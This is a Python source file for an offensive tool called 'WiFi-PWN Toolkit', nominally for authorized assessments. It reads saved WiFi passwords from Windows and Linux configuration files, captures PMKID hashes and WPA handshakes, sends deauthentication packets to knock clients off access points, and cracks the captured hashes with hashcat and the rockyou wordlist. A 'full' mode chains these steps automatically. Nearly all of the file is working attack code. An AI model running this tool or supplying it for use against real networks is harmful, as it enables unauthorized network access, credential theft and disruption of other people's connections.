#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║              WiFi-PWN Toolkit v2.0                          ║
║  Internal Adapter Payload-Based WiFi Password Recovery      ║
║  For Authorized Security Assessments Only                   ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import time
import json
import signal
import argparse
import subprocess
import threading
import platform
import shutil
from datetime import datetime
from pathlib import Path

# ─── ANSI Colors ───
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
B = "\033[94m"
M = "\033[95m"
W = "\033[97m"
N = "\033[0m"
BOLD = "\033[1m"

IS_WINDOWS = platform.system().lower() == "windows"
IS_LINUX = platform.system().lower() == "linux"
IS_ADMIN = False
SCRIPT_DIR = Path(__file__).parent.resolve()
OUTPUT_DIR = SCRIPT_DIR / "wifi-pwn-output"
STOP_FLAG = False

banner = f"""
{BOLD}{C}
   ╔══════════════════════════════════════════════════╗
   ║           WiFi-PWN Toolkit v2.0                  ║
   ║    Payload-Based WiFi Password Recovery          ║
   ║    {W}[ Built-in WiFi Adapter ]{C}                     ║
   ╚══════════════════════════════════════════════════╝
{N}"""

# ─── UTILITY FUNCTIONS ───

def log(msg, level="info"):
    ts = datetime.now().strftime("%H:%M:%S")
    if level == "ok":
        prefix = f"{G}[+]"
    elif level == "error":
        prefix = f"{R}[-]"
    elif level == "warn":
        prefix = f"{Y}[!]"
    else:
        prefix = f"{C}[*]"
    print(f" {prefix} {msg}{N}")

def check_admin():
    global IS_ADMIN
    if IS_WINDOWS:
        try:
            result = subprocess.run(["net", "session"], capture_output=True, text=True, timeout=5)
            IS_ADMIN = result.returncode == 0
        except:
            IS_ADMIN = False
    else:
        IS_ADMIN = os.geteuid() == 0
    return IS_ADMIN

def check_tool(name):
    if IS_WINDOWS:
        return shutil.which(f"{name}.exe") or shutil.which(name)
    return shutil.which(name)

def run_cmd(cmd, timeout=120, shell=False, capture=True):
    try:
        if isinstance(cmd, str) and not shell:
            cmd = cmd.split()
        result = subprocess.run(
            cmd if not shell else cmd,
            capture_output=capture,
            text=True,
            timeout=timeout,
            shell=shell
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "TIMEOUT"
    except FileNotFoundError:
        return -2, "", "NOT_FOUND"
    except Exception as e:
        return -3, "", str(e)

def spinner(stop_event, msg="Running"):
    symbols = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r{C}[*] {msg} {symbols[i % len(symbols)]}{N}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

def signal_handler(sig, frame):
    global STOP_FLAG
    STOP_FLAG = True
    print(f"\n{Y}[!] Interrupted! Cleaning up...{N}")

def install_missing_tools():
    if IS_WINDOWS:
        return
    
    needed = {
        "hcxdumptool": "hcxdumptool",
        "hcxpcapngtool": "hcxtools",
        "hashcat": "hashcat",
        "airodump-ng": "aircrack-ng",
        "aireplay-ng": "aircrack-ng",
        "airmon-ng": "aircrack-ng",
        "iw": "iw",
        "ethtool": "ethtool",
    }
    
    if not IS_LINUX:
        return
    
    missing = []
    for tool, pkg in needed.items():
        if not check_tool(tool):
            if pkg not in missing:
                missing.append(pkg)
    
    if not missing:
        return
    
    print()
    log("Missing tools detected:", "warn")
    for m in missing:
        log(f"  - {m}", "warn")
    
    try:
        ans = input(f"{Y}[?] Install missing tools via apt? [Y/n]: {N}").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return
    
    if ans in ("", "y", "yes"):
        log("Updating package list...", "info")
        code, out, err = run_cmd(["sudo", "apt-get", "update"], timeout=120)
        if code != 0:
            log("apt-get update failed. Try manually: sudo apt-get update", "error")
            return
        
        log(f"Installing: {' '.join(missing)}", "info")
        code, out, err = run_cmd(["sudo", "apt-get", "install", "-y"] + missing, timeout=300)
        if code == 0:
            log("Tools installed successfully!", "ok")
        else:
            log(f"Installation failed: {err}", "error")
    else:
        log("Skipping installation.", "info")

signal.signal(signal.SIGINT, signal_handler)

def ensure_dir(path):
    path.mkdir(parents=True, exist_ok=True)
    return path

def write_report(ssid, bssid, method, status, password, elapsed, speed=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_path = OUTPUT_DIR / "audit-report.txt"
    
    with open(report_path, "a") as f:
        f.write(f"{'='*60}\n")
        f.write(f"Audit Timestamp : {timestamp}\n")
        f.write(f"Target SSID     : {ssid}\n")
        f.write(f"Target BSSID    : {bssid}\n")
        f.write(f"Method Used     : {method}\n")
        f.write(f"Status          : {status}\n")
        f.write(f"Password        : {password}\n")
        f.write(f"Time Elapsed    : {elapsed:.1f}s\n")
        if speed:
            f.write(f"Cracking Speed  : {speed}\n")
        f.write(f"{'='*60}\n\n")
    
    log(f"Report saved to {report_path}", "ok")

# ─── PHASE 1: RECON — Saved WiFi Passwords ───

def recon_windows():
    log("Enumerating saved WiFi profiles...", "info")
    
    code, out, err = run_cmd(["netsh", "wlan", "show", "profiles"])
    if code != 0:
        log(f"Failed to list profiles: {err}", "error")
        return []
    
    profiles = re.findall(r"All User Profile\s*:\s*(.*)", out)
    if not profiles:
        log("No saved WiFi profiles found.", "warn")
        return []
    
    results = []
    for profile in profiles:
        profile = profile.strip()
        code, out, err = run_cmd(["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"])
        if code != 0:
            continue
        
        match = re.search(r"Key Content\s*:\s*(.*)", out)
        password = match.group(1).strip() if match else "[No password / Open network]"
        results.append((profile, password))
        
        print(f"  {G}{profile:30}{N} : {C}{password}{N}")
    
    recon_file = OUTPUT_DIR / "saved-passwords.txt"
    with open(recon_file, "w") as f:
        f.write(f"WiFi Saved Passwords — {datetime.now()}\n")
        f.write(f"{'='*60}\n")
        for ssid, pwd in results:
            f.write(f"{ssid:30} : {pwd}\n")
    
    log(f"Found {len(results)} saved profiles → {recon_file}", "ok")
    return results

def recon_linux():
    log("Checking Linux saved WiFi configs...", "info")
    results = []
    paths = [
        "/etc/NetworkManager/system-connections/",
        "/etc/wpa_supplicant/wpa_supplicant.conf",
    ]
    
    home = Path.home()
    for p in [home / ".config" / "NetworkManager" / "system-connections",
              home / ".config" / "wpa_supplicant"]:
        if p.exists():
            paths.append(str(p))
    
    for path in paths:
        p = Path(path)
        if not p.exists():
            continue
        
        if p.is_dir():
            for conf in p.glob("*"):
                if not conf.is_file() or conf.suffix in [".bak", "~"]:
                    continue
                content = conf.read_text(errors="ignore")
                
                ssid_match = re.search(r'ssid=["\']?([^"\'\n]+)', content)
                psk_match = re.search(r'psk=["\']?([^"\'\n]+)', content)
                
                ssid = ssid_match.group(1).strip() if ssid_match else conf.stem
                psk = psk_match.group(1).strip() if psk_match else "[No key]"
                
                if psk and len(psk) == 64 and all(c in "0123456789abcdef" for c in psk.lower()):
                    psk = f"[Hex encoded, try: echo -n '{psk}' | xxd -r -p]"
                
                results.append((ssid, psk))
                print(f"  {G}{ssid:30}{N} : {C}{psk}{N}")
        
        elif p.is_file():
            content = p.read_text(errors="ignore")
            networks = re.findall(r'network=\{(.*?)\}', content, re.DOTALL)
            for net in networks:
                ssid_m = re.search(r'ssid="([^"]+)"', net)
                psk_m = re.search(r'psk="([^"]+)"', net)
                ssid = ssid_m.group(1) if ssid_m else "[Unknown]"
                psk = psk_m.group(1) if psk_m else "[No key]"
                results.append((ssid, psk))
                print(f"  {G}{ssid:30}{N} : {C}{psk}{N}")
    
    recon_file = OUTPUT_DIR / "saved-passwords.txt"
    with open(recon_file, "w") as f:
        f.write(f"WiFi Saved Passwords — {datetime.now()}\n")
        f.write(f"{'='*60}\n")
        for ssid, pwd in results:
            f.write(f"{ssid:30} : {pwd}\n")
    
    log(f"Found {len(results)} saved configs → {recon_file}", "ok")
    return results

# ─── PHASE 2: PMKID Capture ───

def capture_pmkid(bssid=None, timeout=60):
    log("=" * 50)
    log("PHASE 2: PMKID Capture", "info")
    log("PMKID attack works on most internal WiFi adapters", "info")
    log("=" * 50)
    
    if not check_tool("hcxdumptool"):
        log("hcxdumptool not found. Install: sudo apt install hcxdumptool", "error")
        return None
    
    code, out, err = run_cmd(["iw", "dev"])
    if code != 0:
        log("Failed to detect wireless interfaces. Try: iw dev", "error")
        return None
    
    interfaces = re.findall(r'Interface\s+(\w+)', out)
    if not interfaces:
        log("No wireless interfaces found!", "error")
        return None
    
    log(f"Found interfaces: {', '.join(interfaces)}", "info")
    
    for iface in interfaces:
        log(f"Trying interface: {iface}", "info")
        
        outfile = str(OUTPUT_DIR / f"pmkid-capture-{datetime.now().strftime('%H%M%S')}.pcapng")
        
        cmd = ["sudo", "hcxdumptool", "-i", iface, "-o", outfile, "--enable_status=1"]
        if bssid:
            filter_file = OUTPUT_DIR / "target.txt"
            filter_file.write_text(bssid.lower())
            cmd.extend(["--filterlist_ap", str(filter_file), "--filtermode", "2"])
        
        log(f"Starting PMKID capture on {iface} for {timeout}s...")
        log(f"Command: {' '.join(cmd)}", "info")
        print(f"  {Y}[!] PMKID packets are being sent to APs automatically{N}")
        print(f"  {Y}[!] Wait for 'PMKID found' messages below{N}")
        print()
        
        stop_spinner = threading.Event()
        spinner_thread = threading.Thread(target=spinner, args=(stop_spinner, f"Capturing PMKID on {iface}"))
        spinner_thread.start()
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            start_time = time.time()
            pmkid_found = False
            
            while time.time() - start_time < timeout and not STOP_FLAG:
                try:
                    line = proc.stdout.readline()
                    if line:
                        line = line.strip()
                        if "PMKID" in line or "FOUND" in line.upper() or "EAPOL" in line:
                            print(f"  {G}{line}{N}")
                            pmkid_found = True
                        elif "error" in line.lower() or "fail" in line.lower():
                            print(f"  {R}{line}{N}")
                        elif line:
                            print(f"  {line}")
                except:
                    break
            
            stop_spinner.set()
            spinner_thread.join()
            
            if not STOP_FLAG:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except:
                    proc.kill()
            
            if STOP_FLAG:
                log("Capture interrupted by user.", "warn")
                return None
            
            if not pmkid_found:
                log("No PMKID captured in this window.", "warn")
                log("Try a longer timeout, or check if AP supports PMKID.", "warn")
            
        except Exception as e:
            stop_spinner.set()
            spinner_thread.join()
            log(f"Capture error: {e}", "error")
            return None
        
        if Path(outfile).stat().st_size > 100:
            log(f"Capture saved: {outfile} ({Path(outfile).stat().st_size} bytes)", "ok")
            return outfile
        else:
            log(f"Capture file too small, trying next interface...", "warn")
            Path(outfile).unlink(missing_ok=True)
    
    return None

def convert_pmkid(pcapng_file):
    log("Converting capture to hashcat format...", "info")
    
    if not check_tool("hcxpcapngtool"):
        log("hcxpcapngtool not found. Install: sudo apt install hcxtools", "error")
        return None
    
    hash_file = str(Path(pcapng_file).with_suffix(".22000"))
    essid_file = str(Path(pcapng_file).with_suffix(".essid"))
    
    cmd = ["hcxpcapngtool", "-o", hash_file, "-E", essid_file, pcapng_file]
    code, out, err = run_cmd(cmd, timeout=30)
    
    if code != 0:
        log(f"Conversion failed: {err}", "error")
        return None
    
    log(f"Conversion complete", "ok")
    
    if Path(hash_file).stat().st_size > 0:
        hash_count = len(open(hash_file).readlines())
        log(f"Extracted {hash_count} hashes → {hash_file}", "ok")
        
        if Path(essid_file).stat().st_size > 0:
            essids = open(essid_file).read().splitlines()
            log(f"Networks found: {', '.join(essids)}", "ok")
        
        return hash_file
    else:
        log("No hashes extracted from capture.", "warn")
        return None

# ─── PHASE 3: Cracking Engine ───

def crack_hashcat(hash_file, wordlist=None, mask=None, rules=None, timeout=300):
    log("=" * 50)
    log("PHASE 3: Password Cracking", "info")
    log("=" * 50)
    
    if not check_tool("hashcat"):
        log("hashcat not found. Install: sudo apt install hashcat", "error")
        return None
    
    if not wordlist:
        candidates = [
            str(SCRIPT_DIR / "wordlists" / "common-wifi-passwords.txt"),
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
            "/usr/share/wordlists/realhuman_phill.txt"
        ]
        for c in candidates:
            if Path(c).exists():
                wordlist = c
                break
        
        if not wordlist:
            log("No wordlist found. Downloading rockyou.txt...", "warn")
            wordlist = str(OUTPUT_DIR / "rockyou.txt")
            if not Path(wordlist).exists():
                log("Download: curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "info")
                log("Then re-run with --wordlist rockyou.txt", "info")
                return None
    
    potfile = str(OUTPUT_DIR / "hashcat.potfile")
    
    cmd = ["hashcat", "-m", "22000", "-a", "0", 
           "--potfile-path", potfile,
           "--status", "--status-timer", "5",
           hash_file, wordlist]
    
    if rules and Path(rules).exists():
        cmd.extend(["-r", rules])
    
    if mask:
        cmd = ["hashcat", "-m", "22000", "-a", "3",
               "--potfile-path", potfile,
               "--status", "--status-timer", "5",
               hash_file, mask]
    
    log(f"Starting hashcat...")
    print(f"  {C}Target: {Path(hash_file).name}{N}")
    print(f"  {C}Wordlist: {Path(wordlist).name}{N}")
    print(f"  {C}Mode: {'Mask' if mask else 'Dictionary'}{N}")
    print()
    
    stop_spinner = threading.Event()
    spinner_thread = threading.Thread(target=spinner, args=(stop_spinner, "Cracking... Ctrl+C to stop"))
    spinner_thread.start()
    
    start_time = time.time()
    
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        cracked_pwd = None
        last_speed = ""
        
        while time.time() - start_time < timeout and not STOP_FLAG:
            try:
                line = proc.stdout.readline()
                if not line:
                    break
                line = line.strip()
                
                if "Speed" in line or "Progress" in line:
                    last_speed = line
                elif "Cracked" in line or "Recovered" in line:
                    print(f"  {G}{line}{N}")
                elif line and not line.startswith("Session") and not line.startswith("Start"):
                    print(f"  {line}")
            except:
                break
        
        stop_spinner.set()
        spinner_thread.join()
        
        if not STOP_FLAG:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except:
                proc.kill()
        
        code, out, err = run_cmd(["hashcat", "-m", "22000", hash_file, "--show", 
                                  "--potfile-path", potfile], timeout=10)
        if code == 0 and out.strip():
            lines = out.strip().splitlines()
            if lines:
                parts = lines[0].split(":", 1)
                if len(parts) >= 2:
                    cracked_pwd = parts[1]
                    elapsed = time.time() - start_time
                    log(f"PASSWORD FOUND: {G}{BOLD}{cracked_pwd}{N}", "ok")
                    log(f"Time: {elapsed:.1f}s", "ok")
                    if last_speed:
                        log(f"Speed: {last_speed}", "ok")
                    
                    ssid = "Unknown"
                    with open(hash_file) as f:
                        first = f.readline().strip()
                        parts = first.split("*")
                        if len(parts) >= 5:
                            try:
                                ssid = bytes.fromhex(parts[4]).decode(errors="ignore")
                            except:
                                ssid = parts[4]
                    
                    write_report(ssid, "N/A", "Hashcat", "CRACKED", cracked_pwd, elapsed, last_speed)
                    
                    pwd_file = OUTPUT_DIR / "cracked-passwords.txt"
                    with open(pwd_file, "a") as f:
                        f.write(f"{ssid}:{cracked_pwd}\n")
                    
                    return cracked_pwd
        
        log("Password not cracked.", "warn")
        return None
        
    except Exception as e:
        stop_spinner.set()
        spinner_thread.join()
        log(f"Cracking error: {e}", "error")
        return None

# ─── PHASE 4: Handshake Capture ───

def try_monitor_mode():
    code, out, err = run_cmd(["iw", "dev"])
    ifaces = re.findall(r'Interface\s+(\w+)', out)
    
    for iface in ifaces:
        code, out, err = run_cmd(["sudo", "airmon-ng", "start", iface], timeout=10)
        if "monitor mode enabled" in out.lower() or f"{iface}mon" in out:
            mon_iface = f"{iface}mon"
            log(f"Monitor mode enabled on {mon_iface}", "ok")
            return mon_iface
    
    return None

def capture_handshake(bssid, channel, mon_iface, timeout=120):
    log(f"Starting handshake capture on {mon_iface}...", "info")
    
    outfile = str(OUTPUT_DIR / f"handshake-{datetime.now().strftime('%H%M%S')}")
    
    cmd = ["sudo", "airodump-ng", "-c", str(channel), "--bssid", bssid, 
           "-w", outfile, mon_iface, "--output-format", "pcap"]
    
    stop_spinner = threading.Event()
    spinner_thread = threading.Thread(target=spinner, args=(stop_spinner, "Listening for handshake..."))
    spinner_thread.start()
    
    start_time = time.time()
    
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        while time.time() - start_time < timeout and not STOP_FLAG:
            try:
                line = proc.stdout.readline()
                if not line:
                    break
                line = line.strip()
                if "WPA handshake" in line:
                    print(f"  {G}{BOLD}[★] WPA HANDSHAKE CAPTURED!{N}")
                    print(f"  {line}")
                    break
            except:
                break
        
        stop_spinner.set()
        spinner_thread.join()
        
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except:
            proc.kill()
        
        cap_files = list(OUTPUT_DIR.glob("handshake-*.cap"))
        if cap_files:
            cap_file = str(cap_files[-1])
            log(f"Capture saved: {cap_file}", "ok")
            return cap_file
        
        log("No handshake captured.", "warn")
        return None
        
    except Exception as e:
        stop_spinner.set()
        spinner_thread.join()
        log(f"Capture error: {e}", "error")
        return None

def convert_handshake(cap_file):
    if not check_tool("hcxpcapngtool"):
        log("hcxpcapngtool not found. Install: sudo apt install hcxtools", "error")
        return None
    
    hash_file = str(Path(cap_file).with_suffix(".22000"))
    cmd = ["hcxpcapngtool", "-o", hash_file, cap_file]
    code, out, err = run_cmd(cmd, timeout=30)
    
    if code != 0:
        log(f"Conversion failed: {err}", "error")
        return None
    
    if Path(hash_file).stat().st_size > 0:
        log(f"Converted → {hash_file}", "ok")
        return hash_file
    
    return None

# ─── PHASE 5: Deauth Payload ───

def send_deauth(bssid, client_mac=None, count=5, iface=None):
    if not iface:
        log("Need monitor interface for deauth.", "error")
        return False
    
    log(f"Sending {count} deauth packets to {bssid}...", "info")
    
    cmd = ["sudo", "aireplay-ng", "-0", str(count), "-a", bssid]
    if client_mac:
        cmd.extend(["-c", client_mac])
    cmd.append(iface)
    
    code, out, err = run_cmd(cmd, timeout=30)
    
    if code == 0:
        log(f"Deauth packets sent!", "ok")
        return True
    else:
        log(f"Deauth failed. Internal card may not support injection.", "warn")
        return False

# ─── PHASE 6: Auto Scan ───

def scan_networks(iface=None):
    if IS_WINDOWS:
        log("Scanning networks on Windows...", "info")
        code, out, err = run_cmd(["netsh", "wlan", "show", "networks", "mode=Bssid"])
        if code == 0:
            print(f"\n{C}{out}{N}")
            return out
        return None
    
    if not iface:
        code, out, err = run_cmd(["iw", "dev"])
        interfaces = re.findall(r'Interface\s+(\w+)', out)
        if not interfaces:
            log("No wireless interfaces.", "error")
            return None
        iface = interfaces[0]
    
    log(f"Scanning on {iface}...", "info")
    
    code, out, err = run_cmd(["sudo", "iw", "dev", iface, "scan"], timeout=15)
    if code == 0 and out:
        bssids = re.findall(r'BSS\s+([0-9a-f:]+)', out)
        ssids = re.findall(r'SSID:\s+(.*?)\n', out)
        channels = re.findall(r'DS\s+Parameter set: channel (\d+)', out)
        
        print(f"\n{B}{'SSID':30} {'BSSID':20} {'CH':5}{N}")
        print("-" * 55)
        seen = set()
        for i, bssid in enumerate(bssids):
            if bssid not in seen:
                seen.add(bssid)
                ssid = ssids[i] if i < len(ssids) else "[Hidden]"
                ch = channels[i] if i < len(channels) else "?"
                print(f"  {ssid:30} {bssid:20} {ch:5}")
        
        return True
    
    code, out, err = run_cmd(["sudo", "iwlist", iface, "scan"], timeout=15)
    if code == 0:
        print(f"\n{C}{out[:2000]}{N}")
        return True
    
    log("Scan failed. Try with --interface flag.", "error")
    return None

# ─── DETECT CAPABILITIES ───

def detect_capabilities():
    print(f"\n{B}{'='*50}{N}")
    log("Detecting WiFi adapter capabilities...", "info")
    print(f"{B}{'='*50}{N}")
    
    if IS_WINDOWS:
        code, out, err = run_cmd(["netsh", "wlan", "show", "wirelesscapabilities"])
        if code == 0:
            match = re.search(r'Network monitor mode\s*:\s*(\w+)', out, re.IGNORECASE)
            if match:
                log(f"Monitor mode: {match.group(1)}", "info")
            else:
                log("Monitor mode: Not reported by driver", "warn")
        
        log("Recon (saved passwords): Always works", "ok")
        log("Handshake capture: Needs third-party tool (CommView)", "warn")
        log("Cracking (hashcat): If hashcat is installed", "ok")
        return
    
    if not check_tool("iw"):
        log("iw not found.", "error")
        return
    
    code, out, err = run_cmd(["iw", "dev"])
    interfaces = re.findall(r'Interface\s+(\w+)', out)
    
    if not interfaces:
        log("No wireless interfaces found.", "error")
        return
    
    for iface in interfaces:
        log(f"Interface: {iface}", "info")
        
        code, out2, err = run_cmd(["ethtool", "-i", iface], timeout=5)
        if code == 0:
            driver = re.search(r'driver:\s+(\S+)', out2)
            if driver:
                log(f"Driver: {driver.group(1)}", "info")
        
        code, out2, err = run_cmd(["sudo", "iw", "dev", iface, "set", "monitor", "none"], timeout=5)
        if code == 0:
            run_cmd(["sudo", "iw", "dev", iface, "set", "type", "managed"], timeout=5)
            log(f"Monitor mode: Supported", "ok")
        else:
            log(f"Monitor mode: Not supported on this card", "warn")
        
        if check_tool("hcxdumptool"):
            log(f"PMKID capture: Possible (uses nl80211, works on most cards)", "ok")
        else:
            log(f"PMKID capture: Install hcxdumptool to try", "warn")
    
    log(f"Recon (saved passwords): Always works", "ok")
    log(f"Cracking (hashcat): If hashcat and wordlist installed", "ok")
    log(f"Scan networks: Works on all adapters", "ok")

# ─── MAIN ───

def main():
    global OUTPUT_DIR
    
    if IS_WINDOWS:
        try:
            sys.stdout.reconfigure(encoding="utf-8")
        except Exception:
            pass
    
    parser = argparse.ArgumentParser(
        description="WiFi-PWN Toolkit v2.0 — Payload-Based WiFi Password Recovery (Built-in Adapter)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python wifi-pwn.py recon                    # Extract saved passwords
  python wifi-pwn.py scan                     # Scan nearby networks
  python wifi-pwn.py pmkid                    # Capture PMKID (best for internal cards)
  python wifi-pwn.py pmkid --bssid AA:BB:CC:DD:EE:FF --timeout 120
  python wifi-pwn.py capture --bssid AA:BB:CC:DD:EE:FF --channel 6
  python wifi-pwn.py deauth --bssid AA:BB:CC:DD:EE:FF --iface wlan0mon
  python wifi-pwn.py crack --input hash.22000 --wordlist rockyou.txt
  python wifi-pwn.py full --bssid AA:BB:CC:DD:EE:FF
  python wifi-pwn.py detect
        """
    )
    
    parser.add_argument("command", nargs="?", default="help",
                        help="Command: recon, scan, pmkid, capture, deauth, crack, full, detect")
    parser.add_argument("--bssid", help="Target BSSID (MAC address)")
    parser.add_argument("--channel", type=int, help="Target channel")
    parser.add_argument("--timeout", type=int, default=60, help="Capture timeout in seconds (default: 60)")
    parser.add_argument("--interface", help="Wireless interface name")
    parser.add_argument("--input", help="Input hash/capture file for cracking")
    parser.add_argument("--wordlist", help="Path to wordlist")
    parser.add_argument("--mask", help="Hashcat mask (e.g. ?d?d?d?d?d?d?d?d)")
    parser.add_argument("--rules", help="Hashcat rules file")
    parser.add_argument("--client", help="Client MAC for targeted deauth")
    parser.add_argument("--count", type=int, default=5, help="Number of deauth packets")
    parser.add_argument("--output", help="Output directory")
    parser.add_argument("--no-admin", action="store_true", help="Skip admin check")
    
    args = parser.parse_args()
    
    print(banner)
    
    if args.output:
        OUTPUT_DIR = Path(args.output)
    ensure_dir(OUTPUT_DIR)
    
    if not args.no_admin and not check_admin():
        log(f"This tool needs admin/root privileges.", "error")
        if IS_WINDOWS:
            log("Run as Administrator!", "error")
        else:
            log("Run with: sudo python3 wifi-pwn.py ...", "error")
        sys.exit(1)
    
    if IS_LINUX and not args.no_admin:
        install_missing_tools()
    
    cmd = args.command.lower()
    
    if cmd == "recon":
        log("PHASE 1: Saved WiFi Password Recovery", "info")
        if IS_WINDOWS:
            recon_windows()
        else:
            recon_linux()
    
    elif cmd == "scan":
        scan_networks(args.interface)
    
    elif cmd == "pmkid":
        log("=" * 50)
        log("PMKID Capture Attack", "info")
        log("PMKID is a hash sent by some APs that can be cracked offline", "info")
        log("=" * 50)
        
        pcapng = capture_pmkid(bssid=args.bssid, timeout=args.timeout)
        if pcapng:
            hash_file = convert_pmkid(pcapng)
            if hash_file:
                log(f"Ready to crack: python wifi-pwn.py crack --input {hash_file}", "ok")
    
    elif cmd == "capture":
        log("=" * 50)
        log("WPA Handshake Capture", "info")
        log("=" * 50)
        
        if not args.bssid:
            log("--bssid is required. First run: python wifi-pwn.py scan", "error")
            return
        
        mon_iface = try_monitor_mode()
        if not mon_iface:
            log("Monitor mode failed on internal card.", "error")
            log("Try PMKID capture instead: python wifi-pwn.py pmkid", "info")
            return
        
        if args.channel:
            cap_file = capture_handshake(args.bssid, args.channel, mon_iface, args.timeout)
            if cap_file:
                hash_file = convert_handshake(cap_file)
                if hash_file:
                    log(f"Ready to crack: python wifi-pwn.py crack --input {hash_file}", "ok")
    
    elif cmd == "deauth":
        if not args.bssid:
            log("--bssid is required", "error")
            return
        if not args.interface:
            log("--iface (monitor interface) is required", "error")
            return
        send_deauth(args.bssid, args.client, args.count, args.interface)
    
    elif cmd == "crack":
        if not args.input:
            log("--input <hash.22000 or .cap file> is required", "error")
            return
        
        input_file = args.input
        
        if input_file.endswith(".cap") or input_file.endswith(".pcap") or input_file.endswith(".pcapng"):
            log("Converting capture to hashcat format...", "info")
            hash_file = convert_handshake(input_file)
            if not hash_file:
                return
            input_file = hash_file
        
        crack_hashcat(input_file, args.wordlist, args.mask, args.rules, args.timeout * 5)
    
    elif cmd == "full":
        log("=" * 50)
        log("FULL AUTO MODE: recon -> pmkid -> crack", "info")
        log("=" * 50)
        
        if IS_WINDOWS:
            recon_windows()
        else:
            recon_linux()
        
        if not args.bssid:
            log("No BSSID specified. Scanning first...", "info")
            scan_networks(args.interface)
        
        pcapng = capture_pmkid(bssid=args.bssid, timeout=args.timeout)
        if not pcapng:
            return
        
        hash_file = convert_pmkid(pcapng)
        if not hash_file:
            return
        
        if args.wordlist or args.mask:
            crack_hashcat(hash_file, args.wordlist, args.mask, args.rules, args.timeout * 5)
        else:
            log(f"Capture complete! Crack it: python wifi-pwn.py crack --input {hash_file} --wordlist /path/to/wordlist", "ok")
    
    elif cmd == "detect":
        detect_capabilities()
    
    else:
        parser.print_help()
        print(f"""
{Y}[!] Available commands:{N}
  {C}recon{N}      - Extract saved WiFi passwords from this machine
  {C}scan{N}       - Scan for nearby WiFi networks
  {C}pmkid{N}      - Capture PMKID hash (WORKS ON MOST INTERNAL CARDS)
  {C}capture{N}    - Try WPA handshake capture (needs monitor mode)
  {C}deauth{N}     - Send deauth packets (needs injection support)
  {C}crack{N}      - Crack a captured hash with hashcat
  {C}full{N}       - Full auto: recon -> pmkid -> crack
  {C}detect{N}     - Check what your internal WiFi adapter supports
        """)

if __name__ == "__main__":
    main()